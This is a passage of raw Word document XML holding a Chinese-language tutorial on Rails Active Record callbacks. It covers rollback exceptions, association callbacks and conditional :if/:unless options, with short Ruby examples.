          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 回调则只会抛出一个异常</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A4DEA6D"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随意抛出一个异常，可能会中断预期执行的保存逻辑甚至可能导致未知的失败。而抛出 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveRecord::Rollback</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 异常是特地用来通知 Active Record 需要执行回滚操作。而且该异常会在内部捕捉到并不再抛出。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A275314"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15 关联回调</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61AB0D4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155766">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>回调可以和关联一起工作</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，甚至是通过关联来定义的。例如一个 user 拥有多个 posts。而一个用户的 posts 应到在该用户被销毁是全部删除。我们可以给和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 模型关联的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Post</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 模型添加一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>after_destroy</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 回调：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5376"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="52303483" w14:textId="77777777" w:rsidTr="00155766">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7A29C6B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User &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2FB95DD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xml:space="preserve">  has_many :posts, </w:t>
            </w:r>
            <w:r w:rsidRPr="00474454">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:dependent</w:t>
            </w:r>
            <w:r w:rsidRPr="00474454">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00474454">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; :destroy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="755177E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5171328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EAD4B6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Post &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5933664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155766">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>after_destroy</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> :log_destroy_action</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23E73E9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79599C7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log_destroy_action</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7DD4917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puts 'Post destroyed'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5EDD756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70ED849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p w14:paraId="6303CFE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244C666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user = User.first</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2200625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#&lt;User id: 1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03C8976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user.posts.create!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41659D1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#&lt;Post id: 1, user_id: 1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7249590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&gt;&gt; user.destroy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02E9F05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Post destroyed</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63B5D81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=&gt; #&lt;User id: 1&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1E5B78FB"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16 有条件的回调</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="363D0489"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和校验相同，我们也可以</w:t>
      </w:r>
      <w:r w:rsidRPr="008C4711">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>让回调只有在满足特定的条件时才被触发</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。我们可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:if</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:unless</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项，他们接收一个</w:t>
      </w:r>
      <w:r w:rsidRPr="008C4711">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>符号(symbol)</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，字符串，</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Proc</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Array</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 作为参数。使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:if</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来指定在什么条件下回调*应该*被触发。而当你想指定在何种情况下回调*不应该*触发时，请使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:unless</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DE3BCF5"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16.1 使用</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="006A1637">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>Symbol</w:t>
      </w:r>
      <w:r w:rsidRPr="006A1637">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>作为</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:if</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:unless</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="006A1637">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D4DDE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你可传递给一个 symbol 作为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:if</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:unless</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项的参数，该 symbol 表示一个断言方法的名称，该方法会在回调发生前调用。</w:t>
      </w:r>
      <w:r w:rsidRPr="006A1637">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">当使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006A1637">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:if</w:t>
      </w:r>
      <w:r w:rsidRPr="006A1637">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项时，如果该方法返回 false，回调就不会触发</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>；而</w:t>
      </w:r>
      <w:r w:rsidRPr="006A1637">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">当使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006A1637">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:unless</w:t>
      </w:r>
      <w:r w:rsidRPr="006A1637">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项时，如果该方法返回 true，回调就不会被触发</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。这是最常用的选项。使用这个方式，我们可以注册多个不同的断言方法来确定回调是否应该被触发。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7776"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="5AC62A14" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="75515A5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Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D0334F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6A1637">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>before_save</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> :normalize_card_number, </w:t>
            </w:r>
            <w:r w:rsidRPr="006A1637">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:if</w:t>
            </w:r>
            <w:r w:rsidRPr="006A1637">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006A1637">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; :paid_with_card?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F12AEB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F491B8D"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16.2 使用</w:t>
      </w:r>
      <w:r w:rsidRPr="006A1637">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>String作为</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:if</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:unless</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="006A1637">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32B2EBB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你也可以使用一个字符串作为参数，rails 会使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>eval</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 执行，因此</w:t>
      </w:r>
      <w:r w:rsidRPr="009E0A4C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>该字符串必须含有有效的 Ruby 代码</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="009E0A4C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>你应该只有当条件判断语句很短的时候才使用该方法</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7896"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="5DB17270" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15093F6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Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1ED2BC5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6A1637">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>before_save</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> :normalize_card_number, </w:t>
            </w:r>
            <w:r w:rsidRPr="006A1637">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:if</w:t>
            </w:r>
            <w:r w:rsidRPr="006A1637">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006A1637">
              <w:rPr>
